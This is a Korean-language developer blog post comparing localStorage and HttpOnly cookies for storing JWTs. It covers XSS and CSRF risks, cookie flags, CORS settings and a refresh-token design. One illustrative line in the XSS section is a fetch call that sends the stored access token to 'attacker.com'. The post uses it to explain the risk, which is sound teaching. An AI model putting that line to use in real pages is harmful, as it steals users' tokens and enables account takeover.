---
title: "JWT 저장 위치 - localStorage vs HttpOnly Cookie"
date: 2026-07-06T00:00:00
toc: true
toc_sticky: true
categories:
    - Front-end
tags:
    - JWT
---

## 개요

JWT를 브라우저에 저장할 때 핵심 기준은 "토큰이 JavaScript에서 읽힐 수 있느냐"입니다.

`localStorage`에 저장하면 프론트엔드 JavaScript가 JWT를 직접 읽고 `Authorization: Bearer ...` 헤더에 넣어 요청할 수 있습니다. 반면 `HttpOnly Cookie`에 저장하면 JavaScript에서 토큰을 읽을 수 없고, 브라우저가 요청 시 쿠키를 자동으로 서버에 전송합니다.

보안 관점에서는 보통 "HttpOnly Cookie가 더 안전한 기본 선택"입니다. 특히 XSS 공격으로 토큰이 탈취되는 위험을 줄일 수 있기 때문입니다.

---

## localStorage에 JWT 저장

### 동작 방식

로그인 후 서버가 JWT를 응답으로 내려주면 프론트엔드가 토큰을 받아 `localStorage`에 저장합니다.

```jsx
localStorage.setItem("accessToken", token);
```

API 요청 시에는 직접 꺼내서 헤더에 넣습니다.

```jsx
fetch("/api/users/me", {
  headers: {
    Authorization: `Bearer ${localStorage.getItem("accessToken")}`,
  },
});
```

### 장점

구현이 단순합니다.

백엔드가 쿠키 설정을 신경 쓰지 않아도 됩니다.

모바일 앱, SPA, API 서버 구조에서 이해하기 쉽습니다.

`Authorization` 헤더를 직접 제어할 수 있습니다.

### 단점

가장 큰 문제는 "XSS에 취약"하다는 점입니다.

사이트에 악성 스크립트가 삽입되면 다음처럼 토큰을 그대로 훔칠 수 있습니다.

```jsx
const token = localStorage.getItem("accessToken");
```

JWT는 보통 Bearer 토큰이라서, 탈취한 사람이 그대로 API 요청에 사용할 수 있습니다.

즉, localStorage 방식의 핵심 위험은 "토큰 탈취"입니다.

---

## HttpOnly Cookie에 JWT 저장

### 동작 방식

로그인 성공 시 서버가 JWT를 쿠키로 내려줍니다.

```
Set-Cookie: accessToken=jwt_value; HttpOnly; Secure; SameSite=Lax; Path=/
```

브라우저는 이후 같은 도메인 요청에 쿠키를 자동으로 포함합니다.

프론트엔드 JavaScript에서는 이 값을 읽을 수 없습니다.

```jsx
document.cookie
```

위 코드로도 `HttpOnly` 쿠키는 보이지 않습니다.

### 장점

가장 큰 장점은 "XSS로 토큰을 직접 훔치기 어렵다"는 점입니다.

악성 스크립트가 실행되더라도 JWT 값을 `localStorage`처럼 직접 읽어갈 수 없습니다.

운영 환경에서 다음 옵션과 함께 쓰면 보안성이 좋아집니다.

```
HttpOnly
Secure
SameSite=Lax 또는 Strict
```

### 단점

쿠키는 브라우저가 자동으로 보내기 때문에 "CSRF"를 고려해야 합니다.

예를 들어 사용자가 로그인된 상태에서 악성 사이트에 접속했을 때, 악성 사이트가 사용자의 브라우저를 통해 요청을 보내는 문제가 생길 수 있습니다.

다만 요즘은 `SameSite=Lax` 또는 `SameSite=Strict` 설정으로 많은 CSRF 위험을 줄일 수 있습니다. 그래도 민감한 변경 요청에는 CSRF Token까지 고려하는 것이 좋습니다.

또한 프론트엔드와 백엔드 도메인이 다르면 CORS와 쿠키 설정이 조금 복잡해집니다.

---

## 비교표

| 항목 | localStorage | HttpOnly Cookie |
| --- | --- | --- |
| JS에서 토큰 접근 | 가능 | 불가능 |
| XSS 토큰 탈취 위험 | 높음 | 낮음 |
| CSRF 위험 | 낮음 | 상대적으로 있음 |
| 구현 난이도 | 쉬움 | 약간 복잡 |
| Authorization 헤더 사용 | 쉬움 | 보통 직접 사용 안 함 |
| 브라우저 자동 전송 | 안 함 | 함 |
| 추천도 | 낮음 | 높음 |

---

## 핵심 보안 차이

### localStorage는 XSS에 약함

localStorage 방식은 XSS가 발생했을 때 JWT를 그대로 탈취당할 수 있습니다.

```jsx
fetch("https://attacker.com/steal?token=" + localStorage.getItem("accessToken"));
```

그래서 한 번 토큰이 유출되면, 공격자가 사용자인 척 API를 호출할 수 있습니다.

### HttpOnly Cookie는 XSS 탈취를 막는 데 유리함

HttpOnly Cookie는 JavaScript로 읽을 수 없기 때문에 토큰 값을 직접 빼내기는 어렵습니다.

하지만 XSS가 완전히 무력화되는 것은 아닙니다. 악성 스크립트가 사용자의 브라우저에서 직접 API 요청을 날릴 수는 있습니다.

차이는 이것입니다.

| 공격 상황 | localStorage | HttpOnly Cookie |
| --- | --- | --- |
| 토큰 값 탈취 | 가능 | 어려움 |
| 사용자 브라우저에서 악성 요청 | 가능 | 가능 |
| 공격자가 나중에 다른 곳에서 토큰 재사용 | 가능 | 어려움 |

즉, HttpOnly Cookie는 "토큰 탈취 후 재사용"을 막는 데 강합니다.

---

## 실무 추천 구조

## 추천 1: Access Token은 짧게, Refresh Token은 HttpOnly Cookie

가장 많이 쓰는 구조는 다음과 같습니다.

```
Access Token: 메모리 또는 짧은 만료 시간
Refresh Token: HttpOnly Secure Cookie
```

흐름은 다음과 같습니다.

```
1. 로그인
2. 서버가 Refresh Token을 HttpOnly Cookie로 저장
3. 프론트는 Access Token을 응답으로 받거나 메모리에 저장
4. Access Token 만료 시 /refresh 요청
5. 서버가 쿠키의 Refresh Token을 보고 새 Access Token 발급
```

이 방식은 localStorage에 장기 토큰을 저장하지 않으면서도 UX를 유지할 수 있습니다.

---

## 추천 2: 전부 Cookie 기반으로 처리

프론트와 백엔드가 같은 도메인 또는 같은 서비스 경계에 있다면 JWT를 전부 HttpOnly Cookie로 관리할 수 있습니다.

예시는 다음과 같습니다.

```
Set-Cookie: accessToken=...; HttpOnly; Secure; SameSite=Lax; Path=/
Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Lax; Path=/auth/refresh
```

이 방식은 프론트에서 토큰을 직접 다루지 않기 때문에 보안적으로 깔끔합니다.

다만 API 요청 시 `Authorization` 헤더가 아니라 쿠키 인증 방식으로 처리해야 합니다.

---

## 추천 3: localStorage는 가능하면 피하기

특히 다음 상황에서는 localStorage 저장을 피하는 것이 좋습니다.

| 상황 | 이유 |
| --- | --- |
| 관리자 페이지 | 권한이 강해서 탈취 피해가 큼 |
| 결제, 개인정보, 사내 시스템 | 민감 데이터 접근 가능성 |
| 장기 로그인 토큰 | 탈취 시 오래 악용 가능 |
| 외부 스크립트가 많은 서비스 | XSS 위험 증가 |

꼭 써야 한다면 JWT 만료 시간을 매우 짧게 하고, CSP, XSS 방어, Refresh Token 분리 등을 같이 적용해야 합니다.

---

## 쿠키 설정 예시

### 백엔드 응답 예시

```
Set-Cookie: refreshToken=abc.def.ghi; HttpOnly; Secure; SameSite=Lax; Path=/auth/refresh; Max-Age=1209600
```

각 옵션의 의미는 다음과 같습니다.

| 옵션 | 의미 |
| --- | --- |
| HttpOnly | JavaScript에서 쿠키 접근 불가 |
| Secure | HTTPS에서만 전송 |
| SameSite=Lax | 기본적인 CSRF 방어 |
| SameSite=Strict | 더 강한 CSRF 방어, UX 제약 가능 |
| Path=/auth/refresh | 특정 경로에만 쿠키 전송 |
| Max-Age | 쿠키 만료 시간 |

---

## 프론트엔드 요청 예시

쿠키 기반 인증을 쓴다면 `fetch`에서 credentials 설정이 필요할 수 있습니다.

```jsx
fetch("https://api.example.com/users/me", {
  method: "GET",
  credentials: "include",
});
```

Axios에서는 다음처럼 설정합니다.

```jsx
axios.get("https://api.example.com/users/me", {
  withCredentials: true,
});
```

백엔드 CORS도 함께 설정해야 합니다.

```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://www.example.com
```

주의할 점은 `credentials: include`를 사용할 때 `Access-Control-Allow-Origin: *`는 사용할 수 없다는 점입니다.

---

## 결론

실무 기준으로는 다음처럼 정리하면 됩니다.

| 목적 | 추천 |
| --- | --- |
| 가장 단순한 구현 | localStorage |
| 브라우저 기반 웹 서비스 보안 | HttpOnly Cookie |
| 장기 로그인 유지 | Refresh Token을 HttpOnly Cookie |
| 민감 서비스 | localStorage 피하기 |
| SPA + API 서버 | Access Token 짧게, Refresh Token은 HttpOnly Cookie |

개인적으로 추천하는 기본 구조는 이것입니다.

```
Refresh Token: HttpOnly + Secure + SameSite Cookie
Access Token: 짧은 만료 시간, 가능하면 메모리 저장
```

localStorage는 편하지만 XSS에 의해 JWT가 그대로 탈취될 수 있습니다. HttpOnly Cookie는 구현이 조금 복잡하지만, 토큰 탈취를 줄이는 데 훨씬 유리합니다.

---

## 전체 요약

JWT를 `localStorage`에 저장하면 구현은 쉽지만 XSS 공격 시 토큰이 그대로 탈취될 수 있습니다. `HttpOnly Cookie`에 저장하면 JavaScript에서 토큰을 읽을 수 없어 토큰 탈취 위험이 낮아집니다. 대신 쿠키 자동 전송 특성 때문에 CSRF와 CORS 설정을 신경 써야 합니다. 실무에서는 Refresh Token을 `HttpOnly Secure Cookie`에 넣고, Access Token은 짧게 운영하는 구조가 가장 무난합니다.